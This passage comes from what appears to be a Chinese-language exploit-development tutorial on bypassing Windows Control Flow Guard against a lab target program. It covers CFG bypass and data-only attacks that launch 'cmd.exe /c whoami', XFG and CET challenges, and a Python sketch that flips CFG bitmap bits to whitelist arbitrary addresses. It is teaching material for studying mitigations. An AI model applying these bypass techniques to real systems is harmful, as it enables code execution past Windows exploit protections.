=== [場景 A] 繞過：fn 換成 privileged_action（在 bitmap 裡）===
[PRIVILEGED] executing: calc.exe
（calc.exe 被啟動）

=== [場景 B] data-only：fn 不動，只改 cmd ===
[場景 B] fn 的值：0xXXXXXXXXXXXX（與場景 A 後的值相同）
[場景 B] cmd 的值：cmd.exe /c whoami
[PRIVILEGED] executing: cmd.exe /c whoami
（cmd.exe 被啟動）
```

### 測試 2：bitmap 公式驗證

用 `bitmap_calc.py` 手動驗算場景零的地址選擇是否確實跨越 8-byte 槽：

```bat
python bitmap_calc.py 0x140001100   :: 合法入口
python bitmap_calc.py 0x140001101   :: +1，同槽，bit 可能 = 1
python bitmap_calc.py 0x140001108   :: +8，強制換槽，bit = 0（假設只有入口在 Function Table）
```

確認 `+1` 和入口在同一個 `byte_off`（`addr >> 9` 相同），`+8` 在不同 `byte_off` 或至少不同 bit 槽（`addr >> 3` 不同）。

### 測試 3：data-only 關鍵性質驗證（任何版本）

在靶程式的場景 B 裡，呼叫 `attacker_overwrite_cmd_only` 前後印出 `d.fn` 的值，確認：

```
竄改前：d.fn = 0xXXXX  （某個地址）
竄改後：d.fn = 0xXXXX  （完全相同）
但輸出命令從 "calc.exe" 變成 "cmd.exe /c whoami"
```

這是 data-only 攻擊的形式化定義：**控制流資料（fn）未被修改，業務資料（cmd）被修改，結果被攻擊者控制**。

---

## 延伸挑戰

### 挑戰一：加上 XFG 後的變化

> **未實測，理論預期**（需要 MSVC 支援 `/guard:xfg`，目前 MSVC 2022 Preview 版本中）

XFG（eXtended Flow Guard）在 CFG 的 bitmap 之上加入每個 callsite 的函式原型哈希。繞過 A（合法危險 target）在 XFG 下的難度：

```
CFG 繞過 A 的前提：
  privileged_action 在 bitmap 裡（bit = 1）→ 放行

XFG 繞過 A 的前提：
  privileged_action 在 bitmap 裡（bit = 1）
  + privileged_action 的函式原型哈希 == callsite 期望的哈希
  ← 如果 callsite 的型別是 void(*)(const char*)，
    而 privileged_action 的型別也是 void(*)(const char*)，
    哈希相符 → 仍然放行（繞過 XFG 和 CFG 一樣）
  ← 但如果你嘗試跳到 WinExec（型別是 UINT(LPCSTR, INT)），
    哈希不符 → XFG 攔截

實驗：把場景 A 的 privileged_action 換成 WinExec，
      在 CFG 版本（無 XFG）：WinExec 在 kernel32 的 bitmap 裡 → 放行
      在 XFG 版本：WinExec 的型別哈希與 action_fn_t 的哈希不符 → 擋下
```

### 挑戰二：加上 CET shadow stack 後只能走 data-only

在 Win11 + Intel CET 硬體 + 啟用 shadow stack 的情況下：

- 場景零：CFG 擋（同前）
- 場景 A：CFG 放行（同前）——data-only 的 fn 修改仍然有效（只要 fn 指向合法 target）
- 場景 B：CFG + CET 都看不到問題，data-only 完全有效
- 場景 C（ROP）：CET shadow stack 在每個 ret 時攔截 → 失效

這就是為什麼 Ch 37 說「data-only 是繞過所有 CFI 的最後路線」。試著把靶程式部署在 Win11 + CET 的環境，確認 ROP 不再有效，但 data-only 仍然可以做到。

### 挑戰三：自動化 bitmap 修改（家族四）

> **未實測，理論預期**（需要找到 ntdll 裡儲存 bitmap base 的全域指標位置，各 Windows 版本不同）

理論實作路線：

```python
# bitmap_flip.py — 把任意地址加進 CFG 白名單（概念，非可執行 exploit）
# 前提：已知 CFG bitmap base 地址（ntdll 逆向取得）
#       行程沒有 ACG（否則 bitmap 頁面可能只有 ntdll 的 CFG 函式可寫）

import ctypes

def add_to_cfg_bitmap(bitmap_base: int, target_addr: int):
    """把 target_addr 在 CFG bitmap 裡的 bit 設成 1"""
    byte_off = target_addr >> 9
    bit_idx  = (target_addr >> 3) & 7
    # 讀當前值
    current = ctypes.cast(bitmap_base + byte_off, ctypes.POINTER(ctypes.c_uint8))[0]
    # 設定對應 bit
    new_val  = current | (1 << bit_idx)
    ctypes.cast(bitmap_base + byte_off, ctypes.POINTER(ctypes.c_uint8))[0] = new_val
    print(f"bitmap[0x{byte_off:X}] : 0x{current:02X} → 0x{new_val:02X}")
    print(f"target 0x{target_addr:X} 的 bit {bit_idx} 已設成 1")

# 也可以用 SetProcessValidCallTargets（不需要知道 bitmap base）：
# CFG_CALL_TARGET_INFO target = { offset, CFG_CALL_TARGET_VALID };
# SetProcessValidCallTargets(GetCurrentProcess(), page_base, page_size, 1, &target);
# → 但在 ACG 保護的行程裡，這個 API 被限制
```

---

## 踩雷集錦

1. **「mingw 編的靶也有 CFG，我看 DllCharacteristics 有 GUARD_CF 位元」**：錯。`DllCharacteristics` 的 `GUARD_CF` 位元是連結器設的宣告，但 mingw 的編譯器前端**沒有**在每個 indirect call 前插入 `call [__guard_check_icall_fptr]` 的樁碼。沒有插樁就沒有保護——宣告和實作是兩件事。永遠用 MSVC 才能正確測試 CFG 行為。

2. **「場景零用 +1 byte 當非法 target，但 CFG 沒擋住」**：CFG bitmap 的粒度是 **8 bytes**，不是每個位元組。`privileged_action + 1` 和 `privileged_action + 0` 可能落在同一個 8-byte 槽（`addr >> 3` 相同），bitmap 的那個 bit 已被設成 1（因為函式入口在那個槽），所以 `+1` 也通過了。要強迫非法，用 `+8` 或 `+16`（確保跨越 8-byte 邊界）。

3. **「場景 B 的 data-only 根本沒意義——fn 已經指向 privileged_action 了，不需要改」**：這正是重點。**data-only 攻擊的威力在於：fn（控制流資料）可以是程式本來就會設定的合法值，攻擊者只需要改變 fn 呼叫時使用的資料（cmd 字串）**。在真實場景裡，privileged_action 可能是一個「只有在特定條件下才應該被呼叫的函式」，攻擊者透過竄改 cmd 讓它做了不應做的事，而不需要碰任何控制流指標。

4. **「我的 privileged_action 不在 Guard CF Function Table 裡」**：MSVC 連結器收錄的是「有可能被 indirect call 的函式」。如果 `privileged_action` 在整個程式裡只被 direct call（`call privileged_action`）而從未被 `d.fn(...)` 這樣的間接呼叫過，連結器可能判斷它不需要在 Function Table 裡。確認靶程式裡至少有一處透過函式指標（`d.fn = privileged_action; d.fn(...)` 這樣）呼叫它，才能讓它進入 Function Table。

---

## 自我檢核

- [ ] 不看筆記，能畫出場景零（被擋）的完整流程：從 `d.fn(d.cmd)` 的機器碼，到 `__guard_dispatch_icall_fptr`，到 `LdrpValidateUserCallTarget`，到 bitmap 查詢 bit = 0，到 `RtlFailFast`，到行程終止。每一步都能說出發生了什麼。

- [ ] 能解釋為什麼場景 A（fn 換成 `privileged_action`）在 CFG 下仍然成功，以及 XFG 在什麼條件下會讓它失敗（型別哈希不符）。

- [ ] 能精確描述場景 B 的「data-only」定義：fn 的值在攻擊前後完全相同，CFG 看到的 indirect call target 沒有變化，但 WinExec 的行為被攻擊者完全控制——CFG（甚至 XFG、CET）全部無效。

- [ ] 面試被問「CFG 能防 data-only 嗎」，能給出精確的否定答案，並說明根本原因：CFG 保護的是「control-flow 資料（函式指標、vtable）」，不保護「業務邏輯資料（函式參數、狀態旗標）」。

- [ ] 能說出 ROP 在「CFG 開、CET 未開」vs「CFG 開、CET 也開」兩種環境下的行為差異，以及為什麼 CFG 和 CET 是互補而非冗餘的。

- [ ] bitmap 公式：給定任意地址，能手算出 byte_offset 和 bit_index，並判斷是否和函式入口在同一個 8-byte 槽（決定攻擊者選的「非法 target」是否真的是非法的）。

---

## 延伸閱讀

### 官方文件

- **[Control Flow Guard — Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/secbp/control-flow-guard)**
  - **讀哪裡**：「How Does CFG Work」段落；「Working with Components that Don't Have CFG」
  - **和本練習的關聯**：本練習的靶程式設計直接基於這裡描述的 CFG 插樁機制；裝好 MSVC 後對照「編譯指令」一節
  - **前提知識**：Ch 32 讀完即可

- **[`/guard` (Enable Control Flow Guard) — MSVC 文件](https://learn.microsoft.com/en-us/cpp/build/reference/guard-enable-control-flow-guard)**
  - **讀哪裡**：`/guard:cf` 和 `/guard:xfg` 的語法差異；與 `/Zi` 配合的除錯資訊設定
  - **和本練習的關聯**：編譯靶程式時的旗標選擇；延伸挑戰一（XFG）的前置閱讀
  - **前提知識**：基本 MSVC 編譯流程

### 研究報告

- **[Morten Schenk — "Bypassing Control Flow Guard in Windows 10"（Improsec Blog）](https://improsec.com/tech-blog/bypassing-control-flow-guard-in-windows-10)**
  - **讀哪裡**：「Calling a valid but dangerous function」段落（對應本練習場景 A）；「Calling the target without CFG protection」段落（家族二，non-CFG 模組）
  - **和本練習的關聯**：場景 A 的繞過邏輯在這篇裡有具體的 PoC 說明；先做完本練習再讀，能直接對照
  - **前提知識**：Ch 32/33 + 本練習完成後

- **[Schuster et al. — "Counterfeit Object-Oriented Programming" (IEEE S&P 2015)](https://www.ieee-security.org/TC/SP2015/papers-archived/6949a745.pdf)**
  - **讀哪裡**：Section 3（COOP 的形式化定義，vfgadget 分類）；Section 4（圖靈完備性）
  - **和本練習的關聯**：場景 A 的「合法危險 target」路線系統化成 COOP 後的形態；延伸挑戰一（XFG vs COOP）的理論基礎
  - **前提知識**：本練習場景 A 完成後；C++ vtable 機制（Ch 30）

### 部落格

- **[Connor McGarr — Process Mitigation Policy 分析](https://connormcgarr.github.io/)**
  - **讀哪裡**：CFG bitmap 結構、ACG 與 bitmap 竄改（家族四）的互動說明；`SetProcessValidCallTargets` 的安全含義
  - **和本練習的關聯**：延伸挑戰三（bitmap 修改）的實作背景；場景 C（ROP）在 CET 下失效的機制說明
  - **前提知識**：本練習完成後；Ch 36（ACG）的基本概念

---

本練習把 Ch 32/33/37 的理論轉成三個可觀察、可比對的實驗。場景零讓你親眼看到 CFG 在保護什麼；場景 A 讓你看到 bitmap 粒度（address-level）的弱點；場景 B 讓你確認 data-only 在 CFG + XFG + CET 全開的環境下仍然有效。接下來的章節從緩解對抗轉向 x64 ABI 細節，看呼叫慣例如何影響 exploit 設計。

→ [Ch 40 — x64 ABI / calling convention 對 exploit 的影響](./40-x64-abi.md)
